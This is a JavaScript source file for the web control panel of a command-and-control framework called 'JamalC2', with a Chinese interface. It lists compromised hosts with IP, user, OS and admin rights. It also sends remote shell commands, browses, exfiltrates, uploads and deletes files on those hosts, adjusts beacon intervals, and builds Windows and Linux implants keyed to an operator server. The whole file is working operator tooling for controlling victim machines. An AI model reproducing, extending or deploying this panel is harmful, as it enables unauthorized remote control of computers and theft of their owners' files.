// JamalC2 Web Control Panel - JavaScript

const API_BASE = '';  // Same origin
let selectedClientId = null;
let listeners = [];
let clients = [];

// ============== Polling ==============

async function fetchData() {
    try {
        // Fetch clients
        const clientsRes = await fetch(`${API_BASE}/api/clients`);
        clients = await clientsRes.json();
        updateClientsTable();

        // Fetch listeners
        const listenersRes = await fetch(`${API_BASE}/api/listeners`);
        listeners = await listenersRes.json();
        updateListenerStatus();

    } catch (error) {
        console.error('Failed to fetch data:', error);
    }
}

function updateClientsTable() {
    const count = document.getElementById('clientCount');
    const emptyState = document.getElementById('emptyState');
    const table = document.getElementById('clientTable');
    const tbody = document.getElementById('clientTableBody');

    count.textContent = clients.length;

    if (clients.length === 0) {
        emptyState.style.display = 'block';
        table.style.display = 'none';
        hideClientMenuItems();
        return;
    }

    emptyState.style.display = 'none';
    table.style.display = 'table';

    tbody.innerHTML = clients.map(c => `
        <tr class="${selectedClientId === c.id ? 'selected' : ''}" 
            onclick="selectClient('${c.id}')"
            ondblclick="selectClient('${c.id}'); showShellModal()">
            <td>${c.ip_address}</td>
            <td>${c.tag}</td>
            <td>${c.username}@${c.pc_name}</td>
            <td>${c.beacon_interval}秒</td>
            <td>在线</td>
            <td>${c.country}</td>
            <td>${c.operating_system}</td>
            <td><span class="badge ${c.account_type === 'Admin' ? 'badge-admin' : 'badge-user'}">${c.account_type}</span></td>
        </tr>
    `).join('');
}

function updateListenerStatus() {
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('listenerStatus');
    const listenerInfo = document.getElementById('listenerInfo');

    const running = listeners.filter(l => l.is_running);

    if (running.length > 0) {
        statusDot.classList.add('running');
        statusText.textContent = '运行中';
        listenerInfo.innerHTML = listeners.map(l =>
            `${l.name}: ${l.bind_address}:${l.port} ${l.is_running ? '✓' : '✗'}`
        ).join(' | ');
    } else {
        statusDot.classList.remove('running');
        statusText.textContent = '关闭';
        listenerInfo.innerHTML = '';
    }
}

function selectClient(id) {
    selectedClientId = id;
    updateClientsTable();
    showClientMenuItems();
}

function showClientMenuItems() {
    document.getElementById('menuFile').style.display = 'block';
    document.getElementById('menuBeacon').style.display = 'block';
    document.getElementById('menuDisconnect').style.display = 'block';
}

function hideClientMenuItems() {
    document.getElementById('menuFile').style.display = 'none';
    document.getElementById('menuBeacon').style.display = 'none';
    document.getElementById('menuDisconnect').style.display = 'none';
    selectedClientId = null;
}

// ============== Listener Modal ==============

function showListenerModal() {
    const modal = document.getElementById('listenerModal');
    const title = document.getElementById('listenerModalTitle');
    const submitBtn = document.getElementById('listenerSubmitBtn');
    const extraInfo = document.getElementById('listenerExtraInfo');
    const keyInputGroup = document.getElementById('keyInputGroup');

    if (listeners.length > 0) {
        const l = listeners[0];
        title.textContent = '监听器信息';
        document.getElementById('listenerBtnGroup').style.display = 'none';
        document.getElementById('listenerName').value = l.name;
        document.getElementById('listenerName').disabled = true;
        document.getElementById('listenerBind').value = l.bind_address;
        document.getElementById('listenerBind').disabled = true;
        document.getElementById('listenerPort').value = l.port;
        document.getElementById('listenerPort').disabled = true;
        keyInputGroup.style.display = 'none';
        extraInfo.innerHTML = `
            <div class="form-group">
                <label class="form-label">状态</label>
                <input class="form-input" value="${l.is_running ? '运行中 ✅' : '已停止'}" disabled>
            </div>
            <div class="form-group">
                <label class="form-label">加密密钥</label>
                <input class="form-input" value="${l.encryption_key}" disabled style="font-size:12px;font-family:monospace">
            </div>
            <div class="btn-group" style="margin-top:10px">
                <button class="btn btn-secondary" style="background:#f44336" onclick="deleteListener('${l.id}')">删除监听器</button>
                <button class="btn btn-secondary" onclick="toggleListener('${l.id}', ${l.is_running})">${l.is_running ? '停止' : '启动'}</button>
            </div>
        `;
    } else {
        title.textContent = '创建监听器';
        document.getElementById('listenerBtnGroup').style.display = '';
        submitBtn.textContent = '创建并启动';
        submitBtn.onclick = createListener;
        document.getElementById('listenerName').disabled = false;
        document.getElementById('listenerBind').disabled = false;
        document.getElementById('listenerPort').disabled = false;
        document.getElementById('listenerKey').value = '';
        keyInputGroup.style.display = 'block';
        extraInfo.innerHTML = '';
    }

    modal.style.display = 'flex';
}

function hideListenerModal() {
    document.getElementById('listenerModal').style.display = 'none';
}

async function createListener() {
    const name = document.getElementById('listenerName').value;
    const bind_address = document.getElementById('listenerBind').value;
    const port = parseInt(document.getElementById('listenerPort').value);
    const encryption_key = document.getElementById('listenerKey').value.trim() || null;

    // 验证密钥格式
    if (encryption_key && encryption_key.length !== 64) {
        alert('加密密钥必须是64位十六进制字符串（32字节）');
        return;
    }

    try {
        // Create listener
        const payload = { name, bind_address, port };
        if (encryption_key) payload.encryption_key = encryption_key;

        const createRes = await fetch(`${API_BASE}/api/listeners`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (createRes.ok) {
            const listener = await createRes.json();
            // Start listener
            await fetch(`${API_BASE}/api/listeners/${listener.id}/start`, { method: 'POST' });
            hideListenerModal();
            fetchData();
        }
    } catch (error) {
        alert('创建监听器失败: ' + error);
    }
}

async function deleteListener(id) {
    if (!confirm('确定要删除此监听器吗？')) return;

    try {
        // Stop first if running
        await fetch(`${API_BASE}/api/listeners/${id}/stop`, { method: 'POST' });
        // Then delete
        await fetch(`${API_BASE}/api/listeners/${id}`, { method: 'DELETE' });
        hideListenerModal();
        fetchData();
    } catch (error) {
        alert('删除监听器失败: ' + error);
    }
}

async function toggleListener(id, isRunning) {
    try {
        if (isRunning) {
            await fetch(`${API_BASE}/api/listeners/${id}/stop`, { method: 'POST' });
        } else {
            await fetch(`${API_BASE}/api/listeners/${id}/start`, { method: 'POST' });
        }
        hideListenerModal();
        fetchData();
    } catch (error) {
        alert('操作失败: ' + error);
    }
}

// ============== Shell Modal ==============

let shellHistory = [];

async function showShellModal() {
    if (!selectedClientId) return;

    document.getElementById('shellClientId').textContent = selectedClientId.slice(0, 8) + '...';
    document.getElementById('shellModal').style.display = 'flex';
    document.getElementById('shellInput').focus();

    // 从数据库加载历史记录
    try {
        const res = await fetch(`${API_BASE}/api/clients/${selectedClientId}/shell/history`);
        const history = await res.json();
        if (history.length > 0) {
            shellHistory = history.map(h => ({
                command: h.command === '[response]' ? '[服务器推送]' : h.command,
                output: h.output || '[等待响应...]',
                isError: !h.success
            }));
            // 合并相邻的命令和响应：命令行后面紧跟的 [response] 行合并为一条
            const merged = [];
            for (let i = 0; i < shellHistory.length; i++) {
                const item = shellHistory[i];
                if (item.command === '[服务器推送]' && merged.length > 0 && merged[merged.length - 1].output === '[等待响应...]') {
                    // 将响应合并到上一条命令
                    merged[merged.length - 1].output = item.output;
                    merged[merged.length - 1].isError = item.isError;
                } else {
                    merged.push({ ...item });
                }
            }
            shellHistory = merged;
            updateShellConsole();
        }
    } catch (error) {
        console.error('Failed to load shell history:', error);
    }

    // Start polling for responses
    pollShellResponses();
}

function hideShellModal() {
    document.getElementById('shellModal').style.display = 'none';
}

function clearShell() {
    shellHistory = [];
    document.getElementById('shellConsole').innerHTML = '';
}

async function sendShellCommand(event) {
    event.preventDefault();

    const input = document.getElementById('shellInput');
    const command = input.value.trim();
    if (!command) return;

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}/shell`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command })
        });

        shellHistory.push({ command, output: '[等待响应...]', isError: false });
        updateShellConsole();
        input.value = '';

    } catch (error) {
        shellHistory.push({ command, output: `Error: ${error}`, isError: true });
        updateShellConsole();
    }
}

async function pollShellResponses() {
    if (!document.getElementById('shellModal').style.display ||
        document.getElementById('shellModal').style.display === 'none') {
        return;
    }

    try {
        const res = await fetch(`${API_BASE}/api/clients/${selectedClientId}/shell`);
        const responses = await res.json();

        if (responses.length > 0) {
            for (const resp of responses) {
                // Update waiting entry or add new
                const waitingIdx = shellHistory.findIndex(h => h.output === '[等待响应...]');
                if (waitingIdx >= 0) {
                    shellHistory[waitingIdx].output = resp.output;
                    shellHistory[waitingIdx].isError = resp.is_error;
                } else {
                    shellHistory.push({ command: '[服务器推送]', output: resp.output, isError: resp.is_error });
                }
            }
            updateShellConsole();
        }
    } catch (error) {
        console.error('Failed to poll shell responses:', error);
    }

    setTimeout(pollShellResponses, 500);
}

function updateShellConsole() {
    const console = document.getElementById('shellConsole');
    console.innerHTML = shellHistory.map(item => `
        <div style="color:#4a9eff">&gt; ${item.command}</div>
        <div class="${item.isError ? 'shell-error' : 'shell-output'}">${escapeHtml(item.output)}</div>
    `).join('');
    console.scrollTop = console.scrollHeight;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============== Client Actions ==============

async function disconnectClient() {
    if (!selectedClientId) return;

    if (!confirm('确定要断开此客户端连接吗？')) return;

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}`, { method: 'DELETE' });
        alert('断开连接命令已发送。');
        selectedClientId = null;
        hideClientMenuItems();
        fetchData();
    } catch (error) {
        alert('断开连接失败: ' + error);
    }
}

async function setBeaconInterval() {
    if (!selectedClientId) return;

    const input = prompt('设置心跳间隔（秒）：', '30');
    if (!input) return;

    const interval = parseInt(input);
    if (isNaN(interval) || interval <= 0) {
        alert('请输入有效的数字');
        return;
    }

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}/beacon`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ interval_seconds: interval })
        });
        alert(`心跳间隔已设置为 ${interval} 秒（下次轮询后生效）`);
    } catch (error) {
        alert('设置失败: ' + error);
    }
}

// ============== File Manager ==============

let currentPath = '';  // 空字符串显示驱动器列表
let filePollingInterval = null;

function showFileModal() {
    if (!selectedClientId) return;

    document.getElementById('fileClientId').textContent = selectedClientId.slice(0, 8) + '...';
    document.getElementById('filePath').value = currentPath;
    document.getElementById('fileModal').style.display = 'flex';

    // Start polling for file responses
    if (filePollingInterval) clearInterval(filePollingInterval);
    filePollingInterval = setInterval(pollFileResponses, 500);

    loadDirectory();
}

function hideFileModal() {
    document.getElementById('fileModal').style.display = 'none';
    if (filePollingInterval) {
        clearInterval(filePollingInterval);
        filePollingInterval = null;
    }
}

async function loadDirectory() {
    const path = document.getElementById('filePath').value.trim();
    // 允许空路径（用于显示驱动器列表）

    currentPath = path;
    document.getElementById('fileList').innerHTML = '<div class="empty-state" style="padding:30px">加载中...</div>';

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}/files/list`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path })
        });
    } catch (error) {
        document.getElementById('fileList').innerHTML = `<div class="empty-state" style="padding:30px">加载失败: ${error}</div>`;
    }
}

function goUpDirectory() {
    let path = document.getElementById('filePath').value.trim();

    // Handle Windows paths
    if (path.includes('\\') || path.includes(':')) {
        const parts = path.split('\\').filter(p => p);
        if (parts.length > 1) {
            parts.pop();
            path = parts.join('\\') + '\\';
        } else {
            // 已经在根目录，返回驱动器列表
            path = '';
        }
    } else if (path.includes('/')) {
        // Handle Unix paths
        const parts = path.split('/').filter(p => p);
        if (parts.length > 1) {
            parts.pop();
            path = '/' + parts.join('/');
        } else {
            path = '/';
        }
    } else {
        path = '';
    }

    document.getElementById('filePath').value = path;
    loadDirectory();
}

function goToRoot() {
    document.getElementById('filePath').value = '';
    currentPath = '';
    loadDirectory();
}

async function pollFileResponses() {
    if (!document.getElementById('fileModal').style.display ||
        document.getElementById('fileModal').style.display === 'none') {
        return;
    }

    try {
        const res = await fetch(`${API_BASE}/api/clients/${selectedClientId}/files`);
        const responses = await res.json();

        for (const resp of responses) {
            if (resp.type === 'DirectoryListing') {
                renderFileList(resp.entries, resp.error);
            } else if (resp.type === 'FileDownload') {
                handleFileDownload(resp);
            } else if (resp.type === 'FileUpload') {
                alert(resp.success ? '上传成功！' : `上传失败: ${resp.error || '未知错误'}`);
                if (resp.success) {
                    loadDirectory();  // 上传成功后刷新目录
                }
            } else if (resp.type === 'FileDelete') {
                if (resp.success) {
                    loadDirectory();
                } else {
                    alert(`删除失败: ${resp.error || '未知错误'}`);
                }
            }
        }
    } catch (error) {
        console.error('Failed to poll file responses:', error);
    }
}

function renderFileList(entries, error) {
    const container = document.getElementById('fileList');

    if (error) {
        container.innerHTML = `<div class="empty-state" style="padding:30px">错误: ${error}</div>`;
        return;
    }

    if (!entries || entries.length === 0) {
        container.innerHTML = '<div class="empty-state" style="padding:30px">空目录</div>';
        return;
    }

    // Sort: directories first, then files
    entries.sort((a, b) => {
        if (a.is_dir !== b.is_dir) return b.is_dir - a.is_dir;
        return a.name.localeCompare(b.name);
    });

    container.innerHTML = entries.map(file => `
        <div class="file-item" ondblclick="${file.is_dir ? `enterDirectory('${escapeJs(file.path || file.name)}')` : ''}">
            <span class="file-icon">${file.is_dir ? '📁' : '📄'}</span>
            <span class="file-name">${escapeHtml(file.name)}</span>
            <span class="file-size">${file.is_dir ? '' : formatSize(file.size)}</span>
            <div class="file-actions">
                ${!file.is_dir ? `<button onclick="downloadFile('${escapeJs(file.path || file.name)}')">下载</button>` : ''}
                <button class="delete" onclick="deleteFile('${escapeJs(file.path || file.name)}')">删除</button>
            </div>
        </div>
    `).join('');
}

function enterDirectory(path) {
    // If path is relative, append to current path
    if (!path.includes(':') && !path.startsWith('/')) {
        path = currentPath + (currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\') + path;
    }
    document.getElementById('filePath').value = path;
    loadDirectory();
}

async function downloadFile(path) {
    if (!path.includes(':') && !path.startsWith('/')) {
        path = currentPath + (currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\') + path;
    }

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}/files/download`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path })
        });
        alert('下载请求已发送，请等待...');
    } catch (error) {
        alert('下载失败: ' + error);
    }
}

function handleFileDownload(resp) {
    if (resp.error) {
        alert(`下载失败: ${resp.error}`);
        return;
    }

    // Convert data (array of bytes) to Blob
    const bytes = new Uint8Array(resp.data);
    const blob = new Blob([bytes]);
    const url = URL.createObjectURL(blob);

    // Get filename from path
    const filename = resp.path.split(/[\\\/]/).pop() || 'download';

    // Trigger download
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

async function deleteFile(path) {
    if (!path.includes(':') && !path.startsWith('/')) {
        path = currentPath + (currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\') + path;
    }

    if (!confirm(`确定要删除 ${path} 吗？`)) return;

    try {
        await fetch(`${API_BASE}/api/clients/${selectedClientId}/files/delete`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path })
        });
    } catch (error) {
        alert('删除失败: ' + error);
    }
}

async function handleUpload() {
    const input = document.getElementById('uploadFileInput');
    const file = input.files[0];
    if (!file) {
        console.log('No file selected');
        return;
    }

    console.log('Uploading file:', file.name, 'Size:', file.size);

    // Check file size limit (5MB)
    if (file.size > 5 * 1024 * 1024) {
        alert('文件过大！最大支持 5MB');
        input.value = '';
        return;
    }

    const reader = new FileReader();
    reader.onerror = function (e) {
        console.error('FileReader error:', e);
        alert('读取文件失败');
    };
    reader.onload = async function (e) {
        try {
            // Convert ArrayBuffer to Base64 in chunks to avoid stack overflow
            const bytes = new Uint8Array(e.target.result);
            let binary = '';
            const chunkSize = 8192;
            for (let i = 0; i < bytes.length; i += chunkSize) {
                binary += String.fromCharCode.apply(null, bytes.slice(i, i + chunkSize));
            }
            const base64 = btoa(binary);

            // Determine path separator based on current path
            const sep = currentPath.includes('/') ? '/' : '\\';
            const targetPath = currentPath + (currentPath.endsWith(sep) || currentPath === '' ? '' : sep) + file.name;

            console.log('Uploading to:', targetPath);

            const response = await fetch(`${API_BASE}/api/clients/${selectedClientId}/files/upload`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path: targetPath, data: base64 })
            });

            if (response.ok) {
                alert('上传请求已发送，请等待响应...');
            } else {
                alert('上传请求失败: ' + response.status);
            }
        } catch (error) {
            console.error('Upload error:', error);
            alert('上传失败: ' + error);
        }
    };
    reader.readAsArrayBuffer(file);
    input.value = '';
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function escapeJs(str) {
    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

// ============== Builder ==============

function showBuilderModal() {
    document.getElementById('builderModal').style.display = 'flex';
    document.getElementById('builderStatus').style.display = 'none';

    // 如果有监听器，自动填充加密密钥
    if (listeners.length > 0) {
        document.getElementById('builderKey').value = listeners[0].encryption_key;
        document.getElementById('builderPort').value = listeners[0].port;
    }

    // 更新 UI 状态
    updateBuilderUI();
}

function updateBuilderUI() {
    const type = document.getElementById('builderType').value;
    const title = document.getElementById('builderModalTitle');
    const hint = document.getElementById('builderOutputHint');
    const output = document.getElementById('builderOutput');

    if (type === 'c') {
        title.textContent = '生成 Windows C Implant';
        hint.textContent = '生成文件: ' + output.value + '.exe (Windows PE)';
    } else {
        title.textContent = '生成 Linux Rust Implant';
        hint.textContent = '生成文件: ' + output.value + ' (Linux ELF)';
    }
}

// 监听输入框变化更新提示
if (document.getElementById('builderOutput')) {
    document.getElementById('builderOutput').addEventListener('input', updateBuilderUI);
}

function hideBuilderModal() {
    document.getElementById('builderModal').style.display = 'none';
}

async function buildImplant(event) {
    event.preventDefault();

    const statusDiv = document.getElementById('builderStatus');
    const submitBtn = document.getElementById('builderSubmitBtn');

    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '⏳ 正在编译，请稍候...（首次编译可能需要几分钟）';
    statusDiv.style.color = '#aaa';
    submitBtn.disabled = true;

    const implantType = document.getElementById('builderType').value;

    const request = {
        server_host: document.getElementById('builderHost').value.trim(),
        server_port: parseInt(document.getElementById('builderPort').value),
        use_tls: document.getElementById('builderTls').value === 'true',
        encryption_key: document.getElementById('builderKey').value.trim(),
        tag: document.getElementById('builderTag').value.trim() || 'default',
        output_name: document.getElementById('builderOutput').value.trim() || 'implant',
        implant_type: implantType,
        skip_key_check: document.getElementById('builderSkipKey').checked,
    };

    // 验证密钥格式
    if (!/^[0-9a-fA-F]{64}$/.test(request.encryption_key)) {
        statusDiv.innerHTML = '❌ 加密密钥必须是64位十六进制字符串';
        statusDiv.style.color = '#f44';
        submitBtn.disabled = false;
        return;
    }

    try {
        const response = await fetch(`${API_BASE}/api/builder/build`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(request)
        });

        const result = await response.json();

        if (result.success) {
            statusDiv.innerHTML = `✅ 编译成功！<br><a href="${result.download_url}" style="color:#4CAF50">点击下载 ${request.output_name}</a>`;
            statusDiv.style.color = '#4CAF50';
        } else {
            statusDiv.innerHTML = `❌ 编译失败: ${result.error}`;
            statusDiv.style.color = '#f44';
        }
    } catch (error) {
        statusDiv.innerHTML = `❌ 请求失败: ${error}`;
        statusDiv.style.color = '#f44';
    }

    submitBtn.disabled = false;
}

// ============== Initialize ==============

fetchData();
setInterval(fetchData, 2000);

